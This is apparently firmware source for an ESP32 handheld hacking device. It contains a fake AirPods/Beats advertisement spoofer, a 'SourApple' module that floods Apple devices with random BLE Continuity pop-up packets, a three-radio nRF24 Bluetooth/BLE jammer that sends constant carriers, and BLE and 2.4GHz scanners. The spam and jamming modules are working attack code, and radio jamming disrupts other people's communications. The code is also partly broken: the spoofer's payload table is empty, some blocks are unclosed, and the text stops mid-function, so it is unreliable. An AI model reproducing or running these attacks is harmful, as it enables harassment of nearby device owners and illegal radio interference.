#include "bleconfig.h"
#include "shared.h"
#include "icon.h"
#include "Touchscreen.h"

/*
   BleSpoofer



*/

namespace BleSpoofer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT  320
#define SCREEN_HEIGHT 250
#define LINE_HEIGHT   12
#define MAX_LINES     (SCREEN_HEIGHT / LINE_HEIGHT)

#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT   16
#define ICON_SIZE           16
#define ICON_NUM            5

static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;

String spooferBuffer[MAX_LINES];
uint16_t colorspooferBuffer[MAX_LINES];
int spooferlineIndex = 0;

static bool uiDrawn = false;

BLEAdvertising *pAdvertising;
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint32_t delayMillisecond = 1000;
bool isAdvertising = false;

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;
bool feature_exit_requested = false;
bool feature_active = true;

const uint8_t DEVICES[][31] = {
  // AirPods, Beats, etc. (same as original list)
};

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) {
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  }

  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  return oAdvertisementData;
}

void Printspoofer(String text, uint16_t color, bool extraSpace = false) {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  if (spooferlineIndex >= MAX_LINES - 1) {
    for (int i = 0; i < MAX_LINES - 1; i++) {
      spooferBuffer[i] = spooferBuffer[i + 1];
      colorspooferBuffer[i] = colorspooferBuffer[i + 1];
    }
    spooferlineIndex = MAX_LINES - 1;
  }

  spooferBuffer[spooferlineIndex] = text;
  colorspooferBuffer[spooferlineIndex] = color;
  spooferlineIndex++;

  if (extraSpace && spooferlineIndex < MAX_LINES) {
    spooferBuffer[spooferlineIndex] = "";
    colorspooferBuffer[spooferlineIndex] = TFT_WHITE;
    spooferlineIndex++;
  }

  for (int i = 0; i < spooferlineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorspooferBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(spooferBuffer[i]);
  }
}

void sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;
  String bar = "[";
  for (int i = 0; i < 20; i++) {
    bar += (i < filledBlocks) ? "#" : "_";
  }
  bar += "]";
  Printspoofer(bar, TFT_GREEN);
}

void Airpods()               { device_choice = 0; device_index = 0; attack_state = 1; }
void Airpods_pro()           { device_choice = 0; device_index = 1; attack_state = 1; }
void Airpods_Max()           { device_choice = 0; device_index = 2; attack_state = 1; }
void Airpods_Gen_2()         { device_choice = 0; device_index = 3; attack_state = 1; }
void Airpods_Gen_3()         { device_choice = 0; device_index = 4; attack_state = 1; }
void Airpods_Pro_Gen_2()     { device_choice = 0; device_index = 5; attack_state = 1; }
void Power_Beats()           { device_choice = 0; device_index = 6; attack_state = 1; }
void Power_Beats_Pro()       { device_choice = 0; device_index = 7; attack_state = 1; }
void Beats_Solo_Pro()        { device_choice = 0; device_index = 8; attack_state = 1; }
void Beats_Studio_Buds()     { device_choice = 0; device_index = 9; attack_state = 1; }
void Beats_Flex()            { device_choice = 0; device_index = 10; attack_state = 1; }
void Beats_X()               { device_choice = 0; device_index = 11; attack_state = 1; }
void Beats_Solo_3()          { device_choice = 0; device_index = 12; attack_state = 1; }
void Beats_Studio_3()        { device_choice = 0; device_index = 13; attack_state = 1; }
void Beats_Studio_Pro()      { device_choice = 0; device_index = 14; attack_state = 1; }
void Betas_Fit_Pro()         { device_choice = 0; device_index = 15; attack_state = 1; }
void Beats_Studio_Buds_Plus(){ device_choice = 0; device_index = 16; attack_state = 1; }

void setAdvertisingData() {
  switch (deviceType) {
    case 1: Airpods(); break;
    case 2: Airpods_pro(); break;
    case 3: Airpods_Max(); break;
    case 4: Airpods_Gen_2(); break;
    case 5: Airpods_Gen_3(); break;
    case 6: Airpods_Pro_Gen_2(); break;
    case 7: Power_Beats(); break;
    case 8: Power_Beats_Pro(); break;
    case 9: Beats_Solo_Pro(); break;
    case 10: Beats_Studio_Buds(); break;
    case 11: Beats_Flex(); break;
    case 12: Beats_X(); break;
    case 13: Beats_Solo_3(); break;
    case 14: Beats_Studio_3(); break;
    case 15: Beats_Studio_Pro(); break;
    case 16: Betas_Fit_Pro(); break;
    case 17: Beats_Studio_Buds_Plus(); break;
    default: Airpods(); break;
  }
  updateSpoofer();
}

void toggleAdvertising() {
  isAdvertising = !isAdvertising;

  if (!isAdvertising) {
    pAdvertising->stop();
    Serial.println("Advertising stopped.");
    Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
    updateSpoofer();
  } else {
    if (attack_state == 1) {
      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xF0;
      }

      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();
      delay(delayMillisecond);

      Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
      Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
    }

    Serial.println("Advertising started.");
    updateSpoofer();
  }
}

void runUI() {
  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus, // Device Type Prev
    bitmap_icon_sort_up_plus,   // Device Type Next
    bitmap_icon_key,            // Adv Type Next
    bitmap_icon_power,          // Toggle Advertising
    bitmap_icon_go_back         // Exit
  };

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }

    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: changeDeviceTypePrev(); break;
        case 1: changeDeviceTypeNext(); break;
        case 2: changeAdvTypeNext(); break;
        case 3: toggleAdvertising(); break;
        case 4: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void spooferSetup() {
  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(5, 24);

  updateSpoofer();
  runUI();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  Printspoofer("[!!] System Diagnostics", TFT_RED, true);
  for (int i = 0; i <= 4; i++) {
    sppferLoadingBar(i);
    delay(random(500));
  }

  Printspoofer("[+] System Ready!", TFT_GREEN, true);

  BLEDevice::init("AirPods 69");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);

  uiDrawn = false;
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
}

void spooferLoop() {
  runUI();
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  delay(50);
}

void updateSpoofer() {
  tft.drawLine(0, 292, 240, 292, ORANGE);
  tft.fillRect(0, 293, 240, 50, DARK_GRAY);
  tft.fillRect(50, 295, 150, 16, DARK_GRAY);
  tft.fillRect(60, 310, 150, 16, DARK_GRAY);

  tft.setCursor(5, 295);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.print("Device:");

  int x = 50;
  int y = 295;

  switch (deviceType) {
    case 1:  tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
    case 2:  tft.setCursor(x, y); tft.print("[ Airpods Pro ]"); break;
    case 3:  tft.setCursor(x, y); tft.print("[ Airpods Max ]"); break;
    case 4:  tft.setCursor(x, y); tft.print("[ Airpods Gen 2 ]"); break;
    case 5:  tft.setCursor(x, y); tft.print("[ Airpods Gen 3 ]"); break;
    case 6:  tft.setCursor(x, y); tft.print("[ Airpods Pro Gen 2 ]"); break;
    case 7:  tft.setCursor(x, y); tft.print("[ PowerBeats ]"); break;
    case 8:  tft.setCursor(x, y); tft.print("[ PowerBeats Pro ]"); break;
    case 9:  tft.setCursor(x, y); tft.print("[ Beats Solo Pro ]"); break;
    case 10: tft.setCursor(x, y); tft.print("[ Beats Buds ]"); break;
    case 11: tft.setCursor(x, y); tft.print("[ Beats Flex ]"); break;
    case 12: tft.setCursor(x, y); tft.print("[ BeatsX ]"); break;
    case 13: tft.setCursor(x, y); tft.print("[ Beats Solo3 ]"); break;
    case 14: tft.setCursor(x, y); tft.print("[ Beats Studio3 ]"); break;
    case 15: tft.setCursor(x, y); tft.print("[ Beats StudioPro ]"); break;
    case 16: tft.setCursor(x, y); tft.print("[ Beats FitPro ]"); break;
    case 17: tft.setCursor(x, y); tft.print("[ Beats BudsPlus ]"); break;
    default: tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
  }

  tft.setCursor(5, 310);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.print("Adv Type:");

  switch (advType) {
    case 1: tft.setCursor(60, 310); tft.print("IND"); break;
    case 2: tft.setCursor(60, 310); tft.print("DIRECT HIGH"); break;
    case 3: tft.setCursor(60, 310); tft.print("SCAN"); break;
    case 4: tft.setCursor(60, 310); tft.print("NONCONN"); break;
    case 5: tft.setCursor(60, 310); tft.print("DIRECT LOW"); break;
  }
}

void drawStatusBar(float voltage, bool warn) {
  tft.fillRect(0, 0, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET, DARK_GRAY);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.setCursor(5, 5);
  tft.print("Battery: ");
  tft.print(voltage, 2);
  tft.print("V");

  if (warn && voltage < 3.3) {
    tft.setTextColor(TFT_RED, DARK_GRAY);
    tft.setCursor(160, 5);
    tft.print("LOW!");
  }
}


/*
   SourApple  //fix


*/

namespace SourApple {

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;

uint8_t packet[17];

#define MAX_LINES 30
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;
const int lineHeight = 12;

void updatedisplay() {

  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);

  for (int offset = 0; offset <= lineHeight; offset += 2) {
    tft.fillRect(0, (MAX_LINES - 1) * lineHeight - offset + 34, 240, lineHeight, TFT_BLACK);

    for (int i = 0; i < MAX_LINES; i++) {
      int y = -lineHeight + (i * lineHeight) + offset;
      if (y >= -lineHeight && y < 320) {
        tft.fillRect(0, y + 32, 240, lineHeight, TFT_BLACK);
        tft.setCursor(5, y + 34);
        tft.print(lines[i]);
      }
    }
    delay(5);
  }
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = MAX_LINES - 1; i > 0; i--) {
    lines[i] = lines[i - 1];
  }
  lines[0] = newLine;
  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + " -> ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;                             // Packet Length
  packet[i++] = 0xFF;                               // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;                               // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;                               // ...
  packet[i++] = 0x0F;                               // Type
  packet[i++] = 0x05;                               // Length
  packet[i++] = 0xC1;                               // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];      // Action Type
  esp_fill_random(&packet[i], 3);                   // Authentication Tag
  i += 3;
  packet[i++] = 0x00;                               // ???
  packet[i++] = 0x00;                               // ???
  packet[i++] =  0x10;                              // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {

  tft.setRotation(0);
  tft.setTextSize(1);
  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);


}

void sourappleLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }
  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

  Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  Advertising->addServiceUUID(device_uuid);
  Advertising->setAdvertisementData(oAdvertisementData);

  Advertising->setMinInterval(0x20);
  Advertising->setMaxInterval(0x20);
  Advertising->setMinPreferred(0x20);
  Advertising->setMaxPreferred(0x20);

  Advertising->start();

  delay(40);
  displayAdvertisementData();
}
}


/*
   BleJammer  //fix


*/

namespace BleJammer {

#define CE_PIN_1  14
#define CSN_PIN_1 15
#define CE_PIN_2  26
#define CSN_PIN_2 12
#define CE_PIN_3  17
#define CSN_PIN_3 34

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE };
OperationMode currentMode = BLE_MODULE;

bool jammerActive = false;

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 300
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = TFT_WHITE;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  if (radio1.begin()) configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
  if (radio2.begin()) configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
  if (radio3.begin()) configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();
  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void toggleJammer() {
  jammerActive = !jammerActive;
  Print(jammerActive ? "[+] Jammer Activated" : "[!] Jammer Deactivated", TFT_YELLOW, true);
  initializeRadios();
  updateTFT();
}

void switchMode() {
  currentMode = (currentMode == BLE_MODULE) ? Bluetooth_MODULE : BLE_MODULE;
  Print("[*] Mode switched to: " + String(currentMode == BLE_MODULE ? "BLE" : "Bluetooth"), TFT_WHITE, true);
  initializeRadios();
  updateTFT();
}

void runJammerUI() {
  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > 19 && y < 35) {
        if (x > 20 && x < 36) {
          toggleJammer();
        } else if (x > 95 && x < 111) {
          switchMode();
        } else if (x > 170 && x < 186) {
          feature_exit_requested = true;
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void updateTFT() {
  tft.fillRect(0, 39, 240, 320, TFT_BLACK);
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);
  tft.setTextSize(1);
  tft.setTextColor(WHITE, DARK_GRAY);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, TFT_WHITE);
    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);
    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }
    xPos += spacing;
  }

  tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
}

void blejamSetup() {
  tft.fillScreen(TFT_BLACK);
  tft.setRotation(0);
  setupTouchscreen();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  updateTFT();

  Print("===== System Diagnostics =====", TFT_CYAN, false);
  Print("Initializing TFT display...", TFT_WHITE, false);
  initializeRadios();
  Print("[*] Disabling Bluetooth & WiFi...", TFT_WHITE, false);
  Print("[*] Bluetooth & WiFi disabled.", TFT_WHITE, false);
  Print("[+] System Ready!", TFT_GREEN, true);
}

void blejamLoop() {
  runJammerUI();

  if (jammerActive) {
    int channel;
    if (currentMode == BLE_MODULE) {
      channel = ble_channels[random(0, sizeof(ble_channels) / sizeof(ble_channels[0]))];
    } else {
      channel = bluetooth_channels[random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]))];
    }

    radio1.setChannel(channel);
    radio2.setChannel(channel);
    radio3.setChannel(channel);
  }
}


/*
   BleScan



*/

namespace BleScan {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT  320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;

bool isScanning = false;
bool isDetailView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;

int yshift = 30;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

void runUI() {
  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) startBLEScan();
          break;
        case 1:
          feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      // Icon tap detection
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }

      // Gesture-based navigation
      if (y > 60 && y < SCREENHEIGHT) {
        if (!isDetailView && !isScanning) {
          if (x > SCREEN_WIDTH / 2) {
            isDetailView = true;
            screenNeedsUpdate = true;
            fullScreenUpdate = true;
          } else {
            startBLEScan();
            screenNeedsUpdate = true;
            fullScreenUpdate = true;
          }
        } else if (isDetailView) {
          isDetailView = false;
          screenNeedsUpdate = true;
          fullScreenUpdate = true;
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void displayScanning() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 15 + yshift);
  tft.print("[*] Scanning");
  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }
  tft.setCursor(10, 25 + yshift);
  tft.print("[+] Scan complete!");
  delay(100);
  tft.setCursor(10, 45 + yshift);
  tft.print("[+] Wait a moment");
  isScanning = false;
}

void startBLEScan() {
  displayScanning();
  isScanning = true;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  bleResults = bleScan->start(5, false);
  isScanning = false;
  screenNeedsUpdate = true;
}

void updateBLEList() {
  if (fullScreenUpdate) {
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.fillRect(35, 20, 105, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(35, 24);
    tft.print("BLE Devices:");
  }

  int deviceCount = bleResults.getCount();
  if (deviceCount <= 0) {
    if (fullScreenUpdate) {
      tft.fillRect(0, 20, 140, 16, DARK_GRAY);
      tft.setTextColor(TFT_WHITE);
      tft.setCursor(5, 24);
      tft.print("No Devices Found");
    }
    return;
  }

  for (int i = 0; i < 14; i++) {
    int index = i + listStartIndex;
    if (index >= deviceCount) break;

    int yPos = 15 + i * 18;
    tft.fillRect(0, yPos - 2 + yshift, tft.width(), 18, TFT_BLACK);

    BLEAdvertisedDevice device = bleResults.getDevice(index);
    String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";

    tft.setCursor(10, yPos + yshift);
    if (index == currentIndex) {
      tft.setTextColor(ORANGE, TFT_BLACK);
      tft.print("> " + deviceName);
    } else {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.print("  " + deviceName);
    }
  }
}

void displayBLEDetails() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.fillRect(35, 20, 105, 16, DARK_GRAY);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(35, 24);
  tft.print("Device Details:");

  BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
  String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, 20 + yshift); tft.print("Device: " + deviceName);
  tft.setCursor(10, 40 + yshift); tft.print("MAC: " + address);
  tft.setCursor(10, 60 + yshift); tft.print("RSSI: " + String(rssi) + " dBm");
  tft.setCursor(10, 80 + yshift); tft.print("Tx Power: " + String(txPower) + " dBm");

  if (device.haveServiceUUID()) {
    tft.setCursor(10, 100 + yshift);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    tft.setCursor(10, 100 + yshift);
    tft.print("No Service UUID");
  }

  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    tft.setCursor(10, 120 + yshift);
    tft.print("Manufacturer Data: " + manufacturerData);
  } else {
    tft.setCursor(10, 120 + yshift);
    tft.print("No Manufacturer Data");
  }

  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
   


/*
   2.4GHz Scanner



*/

namespace Scanner {

#define CE  16
#define CSN 17

#define CHANNELS  128
int channel[CHANNELS];

#define N 128
uint8_t values[N];

static bool uiDrawn = false;

#define _NRF24_CONFIG   0x00
#define _NRF24_EN_AA    0x01
#define _NRF24_RF_CH    0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_RPD      0x09

int backgroundNoise[CHANNELS] = {0};

bool scanning = true;

#define SCREEN_HEIGHT 180
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
